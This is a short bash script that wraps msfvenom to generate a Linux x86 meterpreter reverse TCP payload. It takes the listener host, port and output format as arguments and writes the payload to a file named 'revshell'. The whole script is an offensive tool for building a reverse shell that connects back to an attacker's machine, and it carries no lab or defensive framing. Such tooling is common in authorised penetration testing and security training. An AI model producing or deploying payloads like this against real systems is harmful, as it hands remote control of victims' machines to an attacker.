#!/bin/bash

# $1 = LHOST ; $2 = LPORT ; $3 = extension

if [ $# != 3 ]
then
    echo "Missing arguments : LHOST LPORT extension"
    exit
else
    msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -f $3 -o revshell
fi